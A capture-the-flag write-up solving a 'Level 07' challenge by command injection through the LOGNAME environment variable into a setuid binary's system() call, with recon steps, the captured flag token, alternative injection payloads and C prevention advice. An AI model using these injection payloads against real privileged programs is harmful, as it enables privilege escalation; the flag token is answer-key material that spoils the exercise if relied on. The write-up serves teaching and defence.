# Level 07 - Environment Variable Injection

## 🎯 Objective
Exploit environment variable usage in a setuid binary to execute commands as `flag07`.

## 🧠 My Thought Process

### Step 1: "Another setuid binary"
```bash
ls -la
# -rwsr-sr-x 1 flag07 level07 8805 level07

file level07
# ELF 32-bit LSB executable... not stripped
```

### Step 2: "What does it do?"
```bash
./level07
# level07

strings level07
# LOGNAME
# /bin/echo %s
```

**Key findings:**
- It uses the `LOGNAME` environment variable
- It has `/bin/echo %s` - likely uses `printf`-style formatting
- It probably calls `system()` to echo something

### Step 3: "Let's trace the library calls"
```bash
ltrace ./level07
```

```
getenv("LOGNAME")                        = "level07"
asprintf(&buffer, "/bin/echo %s", "level07")
system("/bin/echo level07")              = 0
```

**Now I understand!**
1. Binary reads `LOGNAME` environment variable
2. Constructs command: `/bin/echo $LOGNAME`
3. Passes it to `system()`

### Step 4: "Environment variables are user-controlled!"
The binary trusts my environment variable and puts it directly into a shell command. I can inject shell metacharacters!

```bash
# Normal behavior
LOGNAME="john" → system("/bin/echo john")

# My injection
LOGNAME='$(getflag)' → system("/bin/echo $(getflag)")
```

The `$()` will be expanded by the shell running inside `system()`!

### Step 5: "Execute the exploit"
```bash
LOGNAME='$(getflag)' ./level07
# Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## ✅ Solution
```bash
LOGNAME='$(getflag)' ./level07
```

**Token:** `fiumuikeil55xe9cu4dood66h`

## 📚 Concepts to Learn

### 1. Environment Variables
Environment variables are name-value pairs available to processes:

```bash
# View all environment variables
env

# Set a variable
export MYVAR="value"

# Use in commands
echo $MYVAR
```

Common variables: `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`

### 2. Why Environment Variables Are Dangerous
Programs often trust environment variables without validation:

| Variable | Common Use | Exploit Potential |
|----------|-----------|-------------------|
| PATH | Find executables | Hijack commands |
| LD_PRELOAD | Load libraries | Inject code |
| LOGNAME | Get username | Command injection |
| IFS | Word splitting | Command parsing |

### 3. The system() Function
```c
int system(const char *command);
```

`system()` passes the command to `/bin/sh -c`, which means:
- All shell features work (pipes, redirects, substitution)
- User input can contain shell metacharacters
- **Never put untrusted data in system() calls!**

### 4. Shell Command Substitution
The shell expands special syntax before executing:

```bash
# Command substitution
echo $(whoami)     # Modern syntax
echo `whoami`      # Legacy syntax (backticks)

# Both execute whoami and substitute the output
```

### 5. The Attack Visualization
```
Original expectation:
LOGNAME="level07"
system("/bin/echo level07")
Output: level07

Attacker's injection:
LOGNAME="$(getflag)"
system("/bin/echo $(getflag)")
         ↓
/bin/sh -c "echo $(getflag)"
         ↓
getflag runs, output substituted
         ↓
echo "token_here"
```

### 6. Alternative Payloads
Many injection techniques would work:

```bash
# Command substitution
LOGNAME='$(getflag)'

# Backticks
LOGNAME='`getflag`'

# Command chaining
LOGNAME='; getflag'
LOGNAME='|| getflag'
LOGNAME='&& getflag'

# Subshell
LOGNAME='$(getflag)'
```

## 🔧 Tools Used
- `strings` - Find readable text in binaries
- `ltrace` - Trace library function calls
- `export` - Set environment variables
- Understanding of shell metacharacters

## 🛡️ How to Prevent This
1. **Never trust environment variables** in privileged programs

2. **Sanitize or clear environment:**
   ```c
   // Clear dangerous variables
   unsetenv("LD_PRELOAD");
   unsetenv("LD_LIBRARY_PATH");
   
   // Or use a whitelist
   clearenv();
   setenv("PATH", "/bin:/usr/bin", 1);
   ```

3. **Avoid system()** - Use exec() family:
   ```c
   // Instead of:
   system("echo " + username);
   
   // Use:
   execl("/bin/echo", "echo", username, NULL);
   ```

4. **Input validation:**
   ```c
   // Only allow alphanumeric characters
   for (char *p = input; *p; p++) {
       if (!isalnum(*p)) {
           fprintf(stderr, "Invalid input\n");
           exit(1);
       }
   }
   ```

5. **Principle of least privilege** - Drop SUID privileges before calling system()
